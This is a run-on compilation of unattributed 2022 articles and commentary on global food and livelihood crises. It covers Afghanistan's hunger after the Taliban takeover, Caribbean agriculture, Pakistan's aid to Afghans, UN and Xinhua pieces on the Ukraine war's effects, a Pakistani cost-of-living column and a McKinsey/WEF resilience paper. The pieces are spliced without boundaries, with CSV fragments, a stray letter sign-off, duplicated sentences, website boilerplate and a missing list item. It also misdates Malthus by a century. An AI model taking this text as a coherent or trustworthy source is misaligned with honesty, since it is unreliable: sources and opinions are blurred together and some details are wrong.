The United States has frozen more than $9.5 billion in assets belonging to Afghanistan’s central bank. At the same time, apart from impeding international funding, the United States has also put breaks on most of financial assistance to development projects there. Even before the departure of the American troops, food insecurity and poverty were already rampant in Afghanistan because of a series of droughts, political instability and long-drawn-out conflict. But in the months after the Taliban takeover, the crisis has aggravated very swiftly, much to the surprise of all the stakeholders there and outside. The dwindled foreign development aid that runs into billions of dollars has caused havoc in Afghanistan.

An extreme level of hunger is faced by the majority of Afghans and more than a million children under five are at a high risk of dying from starvation. According to the International Rescue Committee, Afghanistan is on top of annual emergency watchlist of countries whose humanitarian crises are expected to worsen expeditiously in the coming months. Though the general law and order situation in Afghanistan is much better, but the worsening humanitarian crisis is ringing alarm bells for a major human catastrophe in the coming days.

The Taliban regime is not in a position at all to feed the Afghan people. The hunger is quite evident in every town, every village and every street of Afghanistan. Long queues outside the bread shops and riots over the food items in different parts of the country are now a daily routine. Unemployment has also reached unprecedented numbers. The media ramble with the videos showing people selling their kids for as little as $175. This is also a reality that a large number of Afghans are facing the hunger crisis for the first time. Early this year, the United States pledged $308 million in humanitarian assistance for the Afghans. Although miniscule when compared with the minimum requirement of $7 billion to bail out Afghanistan from the existing food crisis, it has provided some ray of hope to the inhabitants of this ill-fated country.

At the same time, to facilitate financial support for some selected educational projects, the Biden administration also showed mollification in its stance with regard to restrictions on the types of interactions humanitarian organisations can keep with the project managers in Afghanistan. A small group of lawmakers in the US Congress is also trying to persuade the Biden administration to release the frozen assets of Afghanistan through the relevant United Nations agencies to support the health and education programmes in Afghanistan. The acute food shortage is getting crueller with each passing day. An acute cash shortage and skyrocketing prices of basic items have culminated in a grave socio-economic crisis in Afghanistan.

The situation is certainly getting out of hand and will have spillover effects on the neighboring countries. The international community must play a role in devising a strategy to inhibit this massive human tragedy in the making. However, the United States cannot absolve itself of the responsibility towards whatever is happening in Afghanistan right now. The Biden administration was well aware of the possible fallout of its tough financial restrictions and asset freezing steps when American troops were withdrawing from Afghanistan in August 2021. Obviously, the main concern of the White House is how to safely transfer the money to the humanitarian organisations in Afghanistan without involving the Taliban and their banking sector.

The Americans are quite wary of the possibility of the leakage of dollars from humanitarian assistance to the Taliban government if they use Afghanistan’s central bank. The best option is to use the appropriate United Nation agencies to carry out the humanitarian activities in Afghanistan which is at the brink of a gruesome food and health crisis at the moment. The White House must act now, otherwise it will be much costlier later — financially and morally.

With Thomas Malthus’s groundbreaking theory that population growth will outrun food supply, the issue of hunger has hit the front burner again. Today, some three centuries later, debate on this topical issue continues as millions of persons have been added to the acute hunger list in the last two years according to the UN FAO Stats. The World Bank reported that the agricultural price index was 40% higher in June 2022 when compared to January 2021. The current food crises are two-fold first, billions do not have enough money to purchase basic food while those that have the money cannot easily access food as shortages cut deeply into supply. Now that all countries rich and poor alike are faced with unprecedented increases in inflation this has forced them back to the drawing board to address the current food insecurity.

The demand-supply imbalance that began with the COVID lockdown and was later aggravated by the Ukraine war along with declining labour force participation in the agricultural sector are the main reasons for the present global food crises. This untenable situation has forced countries as well multilateral institutions to place food security as a priority on their agenda. Guyana last month hosted a high-level Regional Agri-Investment Forum that underlined the need to reduce the dependence on imported food from outside the region by 25% in 2025.

In the past, the Caribbean destroyed its limited agricultural production by importing subsidized food from rich countries mainly the US and EU while creating barriers to its own intra-regional trade. In 2008, the EU and Cariforum signed the Economic Partnership Agreement (EPA) the successor to the Cotonou Agreement despite strong protest from Guyana. The EPA was touted as the development framework that promised higher production and greater market access to the EU. In 2018, a decade after the implementation of the EPA a study by the EU found the most chilling result that trade with Cariforum was flat and hovering around 9 billion Euros while exports to the EU were 4.1 billon. This is almost the same level when the EPA agreement was signed ten years ago while conditions in the Carib-bean worsened.

History has shown that countries that have successfully tackled the food security issue were those that had transformed their agriculture sector with domestic policies and initiatives to a modern sector and not those that depended on foreign aid and handouts. Brazil, India, Chile, Indonesia and Ghana are good examples of such success stories. Chengappa (2018) in the Agricultural Economics Research Review argued that the creation of an agricultural value chain (AVC) is the most viable way to improve farmers’ income and provide a stable means of livelihood. The AVC link involves markets, finance, inputs, research, technology, harvesting, reaping, storage and distribution before the final product reaches the consumers. Each actor acts in tandem with one another, if one of those links is broken it affects the entire process. Towards this, several market-based inventions such as value chains are gaining ground that not only facilitate farmers’ entry into remunerative markets, but also serve as a means to fight against the challenges of food insecurity and poverty.

The Consultative Group on Inter-national Agricultural Research pointed out that research that contributed to higher productivity in agriculture will increase income for both consumers and producers. Consumers will benefit from more product at lower cost while producers will reap higher income from better yields. More details on the benefits to adopting new scientific and digital technology in agriculture can be found on the BBC programme Follow the Food.

The current food crisis provides the best opportunity for policymakers to find immediate solutions to the challenges of environmental threats, soil degradation, and sustainable employment in agriculture. This is the most viable means to reduce poverty and hunger since research has shown that agriculture reduced poverty twice as fast compared to other interventions. Finally, higher productivity in agriculture will contribute to reducing the current high unemployment and inflation while sustaining economic growth.

Yours faithfully,

While the world capitals have all their energies and resources focused on the Ukraine crisis, the challenges faced by the people of Afghanistan are all but forgotten. The war-ravaged country Afghanistan has millions of its people faced with starvation, survival, health care and livelihood crisis. As per the UN Office for the Coordination of Humanitarian Affairs (OCHA), “despite persistent humanitarian needs sparked by years of conflict and recurring drought, the current situation in Afghanistan is unparalleled, with more than 24.4 million people requiring humanitarian assistance to survive”.

Amid this milieu, many experts believe that the ‘international response’ to the Taliban takeover in August 2021 is responsible for the devastating socio-economic conditions of the country and its people. Despite knowing that Afghanistan was heavily dependent on foreign aid for survival and sustainability before the Taliban came to power; the US-led west preferred to halt billions of dollars in assistance while enforcing sanctions that have impeded relief work. Consequently, Afghans and Afghanistan have plummeted deep into the gravest of humanitarian crises.

There is no denying the fact that Ukraine and its people need global support and an end to the crisis but not at the cost of total neglect of deeply-troubled Afghans. After all, the humanitarian crisis in Afghanistan is the baggage left over by the US and its allies as part and parcel of their long thirty-year’s war in Afghanistan. It would be criminal to leave Afghanistan and its people at the mercy of drought, floods, hunger, violence and instability. It would be equally a grave mistake to use and let other regional powers use Afghanistan for their own vested interests by pitching it against Pakistan, China or Central Asian Republics (CARs).

As far as Pakistan is concerned, history has never seen a time when major players had shown enough courage to own their mistakes and failures. Pakistan had always and will continue to be treated like a red-headed stepchild no matter what she does. Nonetheless, Pakistan believes that Afghanistan is its brotherly neighbouring country. They share a common, religious, ethnic and cultural bond. Whatever the differences between the two states are artificial and created by their common enemies. Had this realization of brotherhood not been there, Pakistan would not have extended unflinching and unhindered humanitarian, financial, diplomatic support to Afghanistan in testing times. Pakistan notwithstanding its own economic crisis has provided much-needed relief assistance for flood affected people of Afghanistan during April and May 2022. Pakistan has hosted Afghan refugees for more than 40 years and today hosts 1.4 million registered refugees. However, appreciation by the global community for Pakistan’s role as a generous host is usually need-based. Pakistan’s sacrifices in terms of life, property and financial losses in US’ war on terror are way more than often claimed by many officials of state department in the US. But let’s not talk about what is done. Lou Holtz once said, “If you burn your neighbor’s house down, it doesn’t make your house look any better”. Pakistan understands very well what Holtz said and that is why it had done to build Afghanistan more than its capability for it knew that a stable and prosper Afghanistan means stable and prosper Pakistan.

Pakistan has done its bit now is the time for the international community and the conscious global powers to come forward and lend a helping hand to drowning Afghanistan and its people. The mistrust between the US-led west and interim Afghan government is understandable but it is time to keep politics and wounded egos aside and help Afghans constructively. People of Afghanistan have suffered decades of “others” wars, now is the time for the world to show them that they are not just war-mongers rather committed to help them and plunge them out of poverty and starvation.

Moreover, the COVID-induced economic shock has compounded food insecurity by reducing incomes and disrupting supply chains, leading to an uneven economic recovery. Access to financial markets has been restricted, with some developing States now on the brink of debt default.

“Now the war in Ukraine is amplifying and accelerating all these factors: climate change, COVID-19, and inequality,” Mr. Guterres said.

Ukraine war’s repercussions

Between them, Ukraine and Russia produce almost a third of the world’s wheat and barley and half of its sunflower oil. Russia and Belarus are the world’s number two and three producers of potash, a key ingredient of fertilizer.

The war threatens to tip “tens of millions of people over the edge into food insecurity, followed by malnutrition, mass hunger and famine, in a crisis that could last for years,” warned the UN chief.

“In the past year, global food prices have risen by nearly one-third, fertilizer by more than half, and oil prices by almost two-thirds”.

Devastating societies

Meanwhile, most developing countries lack the fiscal space to cushion the blow of these huge increases with many unable to borrow because markets are closed to them.

“If high fertilizer prices continue, today’s crisis in grain and cooking oil could affect many other foods including rice, impacting billions of people in Asia and the Americas,” he detailed.

Additionally, children are threatened by a lifetime of stunting; millions of women and children will become malnourished; girls will be pulled from school and forced to work or get married; and families will embark on dangerous journeys across continents, just to survive.

“High rates of hunger have a devastating impact on individuals, families, and societies,” spelled out the UN chief.

‘Five urgent steps’

However, if we act together, there is enough food for everyone, he said adding that “ending hunger is within our reach”.

The Secretary-General then outlined five urgent steps to solve the short-term crisis and prevent long-term damage, beginning with reducing market pressure by increasing food supplies – with no restrictions on exports and surpluses available to those most in need.

“But let’s be clear: there is no effective solution to the food crisis without reintegrating Ukraine’s food production, as well as the food and fertilizer produced by Russia and Belarus, into world markets, despite the war”.

Secondly, social protection systems must cover all in need with food, cash; and water, sanitation, nutrition, and livelihood support must be provided.

Fourth, governments must bolster agricultural production and invest in resilient food systems that protect smallholder food producers.

And finally, humanitarian operations must be fully funded to prevent famine and reduce hunger.

Act in solidarity

In closing, the UN chief said that the Global Crisis Response Group on food, energy and finance is tracking the impact of the crisis on vulnerable people, identifying and pushing for solutions.

“The food crisis has no respect for borders, and no country can overcome it alone,” he said.

“Our only chance of lifting millions of people out of hunger is to act together, urgently and with solidarity"".

‘Goodwill’ needed

US Secretary of State Antony Blinken chaired the meeting in which foreign ministers from approximately 30 regionally diverse countries discussed steps to address global food security, nutrition, and resilience.

Describing the current situation as the “greatest global food insecurity crisis of our time,” Mr. Blinken attributed the emergency to conflict, drought and natural disasters – made worse by Russia’s war on Ukraine.

Although hopeful, he said that “there is still a way to go” and that “the complex security, economic and financial implications require goodwill on all sides”.

To address the global crisis, US Secretary announced $215 million in humanitarian aid.

Urgent to open ports

World Food Programme (WFP) chief David Beasley drew attention to a world “too fragile” from years of conflict, pandemic and climate threats.

He also noted that current funding deficits could impede food access by as many as four million people.

Additionally, the top WFP official pointed out that a “failure to open the ports” in and beyond Ukraine will force people to the brink of starvation.

Although the “silos are full,” blockades and other impediments are rendering them inaccessible, Mr. Beasley said, urging governments to “step up” now”.",Livelihood Crisis,2022-05-18 07:00:00

BEIJING, May 30 (Xinhua) -- The months-long Russia-Ukraine crisis has shown no signs of abating, as the talks between Moscow and Kiev have frequently been frustrated.

Given the economic weight of Russia and Ukraine in the world, notably the production of energy and grains, the longer the crisis lasts, the harder the global economy can heal its COVID-19 pandemic wounds.

However, in such a time when peace and development are so desperately needed, the U.S.-led Western countries delivered batches of lethal weapons to Ukraine and imposed bunches of sanctions on Russia, risking perpetuating the regional conflict but leaving the world to foot the bill.





ENERGY SECURITY THREATENED

Russia's energy export has borne the brunt of Western sanctions. On March 8, the United States announced an embargo on Russian oil, liquified natural gas and coal, followed by an EU ban on Russian coal from August, part of its fifth package of sanctions against Russia released on April 8, and a proposed embargo on Russian oil brought forward by the European Commission in early May as part of its sixth sanction package.

Fuel prices are displayed at a gas station in Paris, France, March 16, 2022. (Xinhua/Gao Jing)

But the mounting sanctions against Russia and the tendency to perpetuate them are actually hurting global energy security, as Russia, a major player in the global energy market, accounts for approximately 18 percent, 11 percent and 10 percent of the global coal, oil and natural gas export volumes, respectively.

Energy choke and the ensuing supply chain disruptions have added pressure to the world economy, especially the European economy.

Russia annually sent 155 billion cubic meters of natural gas to Europe before the conflict, and replacing a significant portion of this ""will be exceedingly difficult, with far-reaching consequences for Europe's population, economy, and for the role of gas in the region's energy transition,"" said the Oslo-headquartered energy research and business intelligence company Rystad Energy in a press release on May 9.

Russian gas supplier Gazprom announced on April 27 that it was fully stopping its gas deliveries to Poland and Bulgaria, due to the two EU member states' ""failure to pay in rubles,"" leading to a 20-percent surge in European gas prices.

The fluctuating and rocketing prices and energy inflation have an exacerbating impact on the global economy and livelihood, as several institutions have forecast international energy prices to remain high for years to come.

The World Bank said in a report on April 26 that the increase in energy prices over the past two years has been the largest since the 1973 oil crisis, and estimated that energy prices are expected to rise more than 50 percent in 2022 before easing in 2023 and 2024.

The eurozone's economic growth slowed in the first quarter, as inflation hit a record high in April, with energy prices up 38 percent on an annual basis, becoming a main contributor to the inflation rate. The European Commission projected that the eurozone's pandemic recovery would almost grind to a halt, while prices would surge even more quickly if there are serious disruptions to natural gas supplies from Russia.

The United States, however, has cashed in on the Russia-EU standoff. Washington announced on March 25 that it will provide an additional at least 15 billion cubic meters of liquified natural gas (LNG) for the EU in 2022. That means a two-thirds increase in its LNG export to the bloc.





FOOD CRISIS LOOMS

As Russia and Ukraine play a substantial role in global food production and supply, a prolonged conflict between the two countries would pose major threats to global food security.

UN World Food Program Executive Director David Beasley has warned that the Russia-Ukraine conflict was ""a catastrophe on top of a catastrophe"" and would have a global impact ""beyond anything we've seen since World War II.""

According to the UN Food and Agriculture Organization (FAO), Russia and Ukraine are the world's largest and fifth-largest wheat exporters, respectively. Together, they provide 19 percent of the world's barley supply, 14 percent of wheat and 4 percent of maize, making up more than one third of global cereal exports.

In Ukraine, known as the breadbasket of Europe, the conflict has left wheat planted months ago unharvested, while maize and sunflowers sown when the conflict broke out missed application of fertilizers. It is estimated that Ukraine's grain production may fall by more than 50 percent in the current season.

Moreover, Russia is the lead producer of fertilizers, accounting for 13 percent of the world's production. Restrictions on Russian fertilizer exports due to the U.S. sanctions have led to a surge in global fertilizer prices, forcing farmers in Brazil, the United States and other major agricultural countries to reduce the use of fertilizer, which could affect future harvests.

Food prices have reached an all-time high, as Russian and Ukrainian grain exports are hindered by port disruptions and Western sanctions.

In some European countries, necessities such as flour, cooking oil and canned vegetables are sold in limited quantities.

Less developed areas face even worse conditions. Wheat is a staple food for over 35 percent of the world's population, and Egypt, Turkey, Bangladesh, and Iran are the top global wheat importers, buying more than 60 percent of their wheat from Russia and Ukraine.

Some 50 countries are highly dependent on supplies from Russia and Ukraine, many of which are least developed countries or low-income, food-deficit countries in Africa and Asia, said FAO Director-General Qu Dongyu.

In response to domestic supply shortages and rising food prices, many countries resorted to protectionism and slammed export controls, further fueling the global food inflation and worsening the food crisis.

Since the Russia-Ukraine conflict started in February, the number of countries imposing export restrictions on food and fertilizer products had rose to 23 as of late April, according to the International Food Policy Research Institute. Indonesia, the world's largest palm oil producer, and India, the world's second-largest wheat producer, announced export suspensions in April and May respectively.

World Bank East Asia and Pacific Chief Economist Aaditya Mattoo said export restrictions are an example of prisoners' dilemma, ""where you take action which seems to be in your own interest, but makes everyone including yourself worse.""





RISK OF SOCIAL UNREST

Food and energy are vital to the national economy and people's livelihood, and the social risks brought by their impact should not be underestimated.

""Sharply higher prices for staples and supply shortages are increasing pressure on households worldwide and pushing millions more into poverty,"" the World Bank, International Monetary Fund, UN World Food Program and World Trade Organization said a joint statement released in April.

The fallout from the prolonged pandemic and the Russia-Ukraine crisis has dealt a heavy blow to Sri Lanka, a country for months suffering from food shortages, rising commodity prices, power cuts and currency depreciation, sparking mass protests and forcing its president to declare a state of emergency twice -- in April and May.

Concern for the situation in Africa is growing. UN Secretary-General Antonio Guterres said in early May that the Russia-Ukraine conflict ""aggravates a triple crisis: food, energy and financial"" across Africa.

Even relatively rich Europe is also haunted by the possibility that a livelihood crisis might deteriorate into social unrest. In Barcelona, Spain, the taxi drivers' trade association and the Spanish truck drivers' union organized demonstrations and strikes to protest against fuel price increases, which temporarily disrupted supplies of goods and raw materials.

In recent months, international organizations and institutions have lowered their forecasts for global economic and trade growth and other key indicators.

The next 18 months are looking bleak for every rural and urban household, except those in the top 5pc of the income and wealth distributions.

A moment of crisis opens up a moment to think creatively and implement solutions for long-standing problems; it is reasonable to expect that the current one should allow for the same.","AMONG the works of some historians, one can find a crisis-centred view of large-scale transformation. The argument is that moments of great crises — natural calamities, wars and famine, and economic breakdown — often precede substantial changes in the way states operate and how societies progress.

In the midst of a major cost-of-living crisis in Pakistan, various economists have urged the current government to make the most of these adverse circumstances to induce long-standing corrections in the way the economy is governed. These include the removal of blunt, untargeted, and regressive consumer subsidies — such as the one on fuel, electricity, and gas prices; and the transfer of various rents and tariff-based protections offered to domestic industries, that have rendered much of Pakistan’s manufacturing economy uncompetitive on a global stage.

Alongside these familiar, expenditure-related steps, there is also advice aplenty on improving the revenue side of the equation, by rationalising the tax base, making some sectors pay their fair share, and reducing the disproportionate burden that falls on low and middle-income citizens by way of indirect taxes.

Perhaps the most salient advice circulating, and one that generates considerable consensus among policy researchers at least, is the need to change governmental regulation around land. This would involve some combination of increasing the quantum and coverage of property taxes on built properties in first- and second-tier cities to bring them closer in line to comparable cities across the world; a second intervention would be penalising the hoarding of vacant land (ie the use of empty plots as a store of wealth) through an annual tax; and a third one would be to increase tax rates such as CGT and stamp duty on the transaction of property to curtail speculative trade in plots and files. This can be done in tandem with increasing the assessment rates of property through the DC and FBR tables of valuation for provincial and federal government taxes respectively.

The next 18 months are looking bleak for every rural and urban household, except those in the top 5pc of the income and wealth distributions.

The change of regulations around land, and the expenditure reforms mentioned earlier, essentially target the overall structure of the macroeconomy. The notion behind this is that once these basic macroeconomic fundamentals are put in place, the country will be on a more sound footing to pursue growth, largely by way of improved capital flows to productive sectors and more exports. Right now, it’s clear that the country cannot afford the standard type of growth that we do get — i.e. that which is mostly consumption-driven.

Where, in my view, the conversation currently falls short though, is that this period of adjustment inflicts a great deal of pain on large swathes of the population. Higher energy prices first directly eat into stagnant incomes and then unleash second-order inflationary effects later in the year. Slowing down of the economy will also mean fewer jobs and greater unemployment. Combined with the commodity super-cycle, the next 18 months or so are looking very bleak for every rural and urban household, except perhaps those in the top five per cent of the income and wealth distributions.

Conventionally, it was thought that Pakistan’s large (anywhere between 40pc to 60pc of GDP) informal economy acts as a suitable cushion during periods of high inflation and stagnant economic activity. But vulnerability surveys along with recent Labour Force Survey data shows that this modicum of protection is no longer sufficient. The country needs a far more categorical and purposeful approach towards protecting its citizens from unfettered inflation.

There are two such things that the current government can do: As in the case of the previous, PTI-led government, a moment of crisis — the Covid-19 pandemic — opened up for expanded social protection coverage through the Ehsaas Emergency Cash Transfer programme. In 2020, the outlay for direct cash transfers increased significantly to around 3.5pc of total GDP to mitigate against the livelihood fallout of the virus itself. It also opened up the possibility of using digital technologies to monitor and expedite cash transfers, and create better metrics for the inclusion of vulnerable populations.

This is a programme that every successive government has built on, and the current one should look to expand it in more fruitful ways. There are encouraging signs that an income-support system that tries to capture populations based on income/consumption rather than asset-scores (which tend to exclude the urban poor who are likely to suffer due to income shocks) is in the works. The proposed coverage would be around 70 million low-income citizens, or roughly one-third of the total population. However, given the scale of the cost of living crisis facing the country, this figure may have to go up to cover lower-middle income households as well.

The second area that requires urgent work is the development of a viable and effective public distribution system for basic commodities. Conventional economists tend to prefer cash transfers because they can be targeted better and are more efficient, plus they allow for citizens to spend on their own priorities. This argument is generally sound.

However, in a context where inflation drives up prices on a weekly basis, and shortages plague households across the country, creating a mechanism that allows for subsidised and assured access to food-related essentials is going to be key. The last attempt at the Ehsaas Rashan programme was convoluted, given that it attempted to balance efficiency concerns with social protection ones and took too long to get off the ground. Going forward, it may be worth evaluating alternative designs that are linked with the existing BISP database and payment mechanism to identify the right households for targeted provision of goods. A moment of crisis opens up a moment to think creatively and implement solutions for long-standing problems; it is reasonable to expect that the current one should allow for the same.

Disruptions are not new, and societies have developed sophisticated ways of managing them, using institutions to create stability against extreme events.

Please email us at: McKinsey_Website_Accessibility@mckinsey.com At the annual meeting in Davos, Switzerland, in 2022, the World Economic Forum launched the Resilience Consortium, to gather committed leaders from the public and private sectors to build resilience globally—across regions, economies, and industries. The context and objectives of the Resilience Consortium are explored in depth in this position paper created by Børge Brende, president of the World Economic Forum, and Bob Sternfels, global managing partner of McKinsey & Company.

Today, the world is beset by several crises of global importance. Russia’s invasion of Ukraine has precipitated a humanitarian tragedy with far-reaching social and economic consequences. The refugee crisis stemming from this war amplifies attention on a wider refugee crisis involving tens of millions of people around the globe. The economic and humanitarian repercussions of rising costs of energy and food are likewise intensifying. The war in Ukraine has also shocked a world weary and damaged by the COVID-19 pandemic. The virus has taken more than six million lives, and in April 2022, it is still causing thousands of deaths each day.

The context within which these disruptions occur, furthermore, is an ever-present climate crisis, whose effective mitigation will require a global transition to a low-carbon economy. The human displacement and economic cost this entails could become disruptors of historic proportions in their own right.

The current era is increasingly defined by the interplay of complex disruptions, with their disparate origins and long-term consequences. Institutions are not fully prepared for the new reality, often reacting separately to each disruption.

This position is untenable and organizations are finding that their current risk management practices must evolve to suit this new environment. Leaders are now discussing resilience as the essential condition. How can public- and private-sector organizations arrive at a resilient stance, alert to what is over the horizon, ready to withstand shocks and accelerate into the next reality? Resilience has been described as the ability to recover quickly but recovery alone is not an adequate goal. Truly resilient organizations bounce back better and even thrive.

1. Meeting the challenges crises pose to sustainable, inclusive growth

Lessons from past crises should inform innovative, adaptable solutions to future disruptions.

Resilience pertains to public- and private-sector organizations, as well as to whole economies and societies. The resilient stance for organizations must be forward-looking, anticipating disruption rather than simply reacting, but continuously learning and amending based on experience.

Disruptions are focal points that reveal where capabilities are strong and where investment is needed. The experience of past crises and disruptions teaches essential lessons on how to proceed. These lessons will contribute to the architecture of the common resilience framework across the public and private sectors.

1.1 Managing disruptions defines sustainable growth more than managing continuity

Crises damage institutions and communities, but the process of rebuilding can create stronger foundations for future growth. The financial crisis and recession of the late-2000s, for example, led to actions by banks and regulatory changes that made the banking system stronger. The system has remained robust through subsequent economic disruptions. Likewise, changes introduced during the COVID-19 pandemic can provide new impetus for accelerated growth: the shift toward digitalization, new hybrid working models, the rethinking of supply chains, and the acceleration of public investments toward climate change. These are the kinds of structural shifts that crises often force on otherwise recalcitrant institutions. Resilience is thus more than protective measures; it is also the ability to reinvent and innovate in response to disruptions.

1.2 Crises evolve across categories and do not have single-point solutions

Significant crises are not single-issue events confined to rigid categories. They break through predefined areas of expertise and responsibilities, gaining momentum as they grow in scope and across regions. The COVID-19 pandemic spread worldwide as a public-health crisis but quickly evolved into an economic, social and, in places, organizational crisis.

The issues that trigger crises, and the public- and private-sector responses to these primary issues, have initial effects and produce secondary and tertiary effects. These can give rise to a new primary issue. To navigate these rapid interactions, organizations need to respond with sets of correlated solutions that can be adjusted as conditions evolve.

1.3 Networks hide interdependencies, accelerating crises (although they can also enable faster recovery)

The extent of networks within the global economy, societies, and industries is only partly visible. In a disruption, hidden interdependencies can emerge, unexpectedly accelerating the impact. Supply chain disruptions affect production, availability, and prices more quickly. The war in Ukraine threatens food security in low-income countries in the Middle East and North Africa. New and hidden interconnectivity makes systems more vulnerable. On the other hand, networks that provide more flexibility and reduce interdependencies permit a wider range of solutions to emerge and be shared quickly. Understanding networks and connections better in today’s environment is a key aspect of resilience.

1.4 Lack of preparation and inadequate responses can magnify the damage of crises

A poor response can easily magnify the damage directly caused by a crisis. An effective response, on the other hand, can significantly limit the damage. Decisions are crucial, and past crises have certainly produced their share of bad ones. Even highly successful organizations make decisions that, in hindsight, were all wrong. However, few probe more deeply about why bad decisions are made. It may seem obvious, but the reason is usually that the decision was not well thought out. Under pressure, leaders tend to favor action that can be implemented quickly, eschewing a slower, more thoughtful course. Decisions made under pressure and at speed can entail unintended consequences. The resilience framework will necessarily provide space for thoughtful decision making. Organizations will need to create the means for deciding when to move quickly and when to slow down, and test decisions in a given crisis with people outside of the core network.

1.5 Crises disproportionately affect the most vulnerable

Crises and disruptions cut deeper in poorer countries, among more marginalized and vulnerable population segments and particularly in fragile and conflict-affected states. Inequality in terms of income, wealth, social mobility, health, access to services, and learning opportunities leads to an unequal baseline for resilience. In developed economies, the recovery from the pandemic relies on ample government stimulus spending. Low-income countries rely on development assistance and emergency loans from international financial institutions, increasing the risk of sovereign debt vulnerabilities. The stimulus measures in richer countries magnify demand, putting further pressure on pandemic-disrupted supply chains. This dynamic has resulted in higher commodity prices and consumer inflation, which, in turn, have hit lower-income countries hardest. Other global developments, positive as they are for richer countries, could cause hardship in poorer countries, including the accelerated shift to the digital economy and pressures to reduce carbon emissions.

Growth is sustainable insofar as it supports the health and repair of the natural environment; it is inclusive when it meaningfully improves the livelihood of wider population segments.

According to their nature, many crises transmit globally the effects of heavier burdens, which are borne immediately by developing nations. Resource scarcity or refugee crises created by wars or climate change make the emphasis on inclusive growth of crucial importance. Exposed populations must not be left behind on a shared planet. The disruptions should be seized upon as opportunities to ramp up collective efforts to improve habitats, food and water security, public health, and social and technical infrastructure where these are most needed.

The rise in fragility and decrease in resilience among some populations or in some country contexts pose additional risks of spillover effects, including deeper supply chain disruptions, increases in extreme poverty, and the potential for conflict. A resilience muscle must ultimately serve the broader goal of sustainable, inclusive growth. Growth is sustainable insofar as it supports the health and repair of the natural environment; it is inclusive when it meaningfully improves the livelihood of wider population segments. At a company level, questions of equality and fairness are directly linked to an organization’s purpose and values discussions.

1.6 Crisis preparedness goes beyond financial reserves and buffers

Optimal crisis preparedness includes defensive measures such as buffers and financial reserves but equally important are active response capabilities. These allow organizations to quickly adapt, grow into the new conditions and move fast on new opportunities. Crises have accelerated the growth of the digital economy, with more organizational and societal buy-in for remote meetings, cloud computing, and digital banking. In the automotive industry, vehicle electrification is expanding as governments set emissions targets, offer subsidies, and install charging infrastructure.

In the public and governmental spheres, many national healthcare systems and pandemic-response programs are overstressed. Success in applying existing emergency plans has varied from country to country and within states and departments. The difficulties underscore the importance of combining defensive buffers (stockpiles of supplies and financial resources) with flexibility and less centralized approaches. Certainly, geopolitical crises can have serious implications for supply chains and energy supplies. Buffers will provide only partial, temporary solutions. Response capabilities and adaptability therefore matter as much as preparedness. In crises, half the impact arises from the crisis itself, while the other half, good or bad, is determined by the response.

2. Resilience perspectives of the public and private sectors

Strategies across sectors must be coordinated to ensure that disruptions do not diminish growth.

Resilience is a broadly used term covering many aspects of organizational health and operations within governments and public foundations as well as corporations and financial institutions. The World Economic Forum Resilience Consortium endorses the strategic view of resilience and emphasizes the long-term ability of organizations and economies to create the capabilities needed to deal with disruptions, withstand the shocks, and continuously adapt as disruptions and crises arise over time. It is the strategic prerequisite for long-term, sustainable, and inclusive growth.

Resilience failures cost. World Economic Forum research suggests that the impact of resilience (or lack of it) on annual GDP growth is 1 percent to 5 percent globally. In the COVID-19 pandemic, for example, workforce attrition may have shaved 3.6 percent off growth in some countries. In addition, low vaccination rates in developing countries have reduced growth by 1 percent. Beyond the pandemic, income, gender, and racial inequalities are likely to reduce growth by between 0.6 percent and 1.0 percent, while extreme weather events are taking 0.4 percent of growth. On the other hand, success in reskilling and upskilling the labor force in the digitizing economy could increase growth by 4.5 percent annually to 2030. Proportionate short- and long-term economic improvements can be captured through successful responses to the major risks and impact drivers in each of the resilience themes. Given the interconnectedness of the themes, the enhancements are not discrete and cumulative, and their magnitude will vary across economies, industries, and populations (Exhibit 1).

2.1 Business resilience

Resilient organizations and economies accelerate from inflexion points. Crises and disruptions expose weaknesses, separating the resilient from the unprepared. McKinsey’s research has shown that companies evaluated as more resilient generated greater shareholder value than less resilient peers across the entire life cycle of the major economic shocks of the past two decades.

In the world financial crisis of 2007–09, resilient companies generated around 20 percent more shareholder returns, an advantage which accelerated to around 50 percent in the turnaround years of 2009–11 and 120 percent during the stable period of 2011–17. Two equally important dimensions of resilience emerged: financial strength (cash reserves, a flexible cost base, and profitability) and decisive adaptations to the business model through divestments and reinvestments.

A study of the performance of 1,500 companies during the financial crisis revealed that 20 percent in every sector emerged from the trough of the downturn a little ahead of the rest.

A study of the performance of 1,500 companies during the financial crisis revealed that 20 percent in every sector emerged from the trough of the downturn a little ahead of the rest. They then converted that small advantage into clearly superior performance against peers for the next decade. Assumptions that the better performance resulted from long entrenched advantages did not withstand close inspection. The resilient companies had not been the clear leaders before the disruption, and most did not have preexisting businesses that the disruption advantaged. What the 20 percent did have was a self-made advantage, which they acquired by moving fast, early, and decisively in the disruption. This did not happen accidentally; strategies had been worked out in advance to protect margins (rather than revenue) or to buy good businesses at deflated prices and use them to catalyze growth as the downturn shifted to recovery.

Likewise, through the downturn and disruptions of the COVID-19 pandemic, resilient companies generally performed better than their peers. The “resilients” generated 10 percent more total shareholder returns during the economic downturn of Q4 2019 to Q2 2020. During the period of economic recovery (Q2 2020–Q3 2021), the differential accelerated to 50 percent. These adapted more flexibly in the economic slump and pivoted quickly to meet the resurgence in demand. They embraced digitalized business models, organizational flexibility, and needed business portfolio changes (Exhibit 2).

Exhibit 2 We strive to provide individuals with disabilities equal access to our website. If you would like information about this content we will be happy to work with you. Please email us at: McKinsey_Website_Accessibility@mckinsey.com

Business leaders will play a crucial role in steering society toward this more prosperous, sustainable, and inclusive future. The business sector drives 72 percent of GDP and as much as 85 percent of technology investment and labor productivity growth.

2.2 Economic and societal resilience

Similar patterns can be observed at the level of economies and societies, with financial measures or public-health interventions, for example. Once the COVID-19 pandemic struck, countries that combined fiscal stimulus with effective management were able to stabilize local economies and protect societies. Many countries recovered quickly, but the pace varied from country to country.

While economic resilience can be measured by overall long-term growth, an important aspect considers societal resilience as a reflection of social, gender, and racial-ethnic inequalities. The Organisation for Economic Co-operation and Development (OECD) estimated the relationship between income inequality and GDP growth per capita. It found that the change over time in income inequality (measured as the ratio of top to bottom income deciles) has a significant impact on GDP per capita on average across OECD countries. The impact is statistically significant: an increase in income inequality of 1 percent lowers overall GDP potential by 0.6 percent to 1.1 percent.

In the United States, the median wealth of White families is ten times that of Black and Hispanic families, whose wealth did not essentially change between 1992 and 2016, a 24-year period.

The World Bank measures the economic cost of gender inequality globally at $160.2 trillion, an astonishing number. The research discovered that women possess only 38 percent of individual wealth overall and less than 33 percent in low- and lower-middle-income countries. The study emphasized that investments in advancing education and opportunity for girls and women make economic sense since closing the gender wealth gap is essential for sustainable, inclusive development.

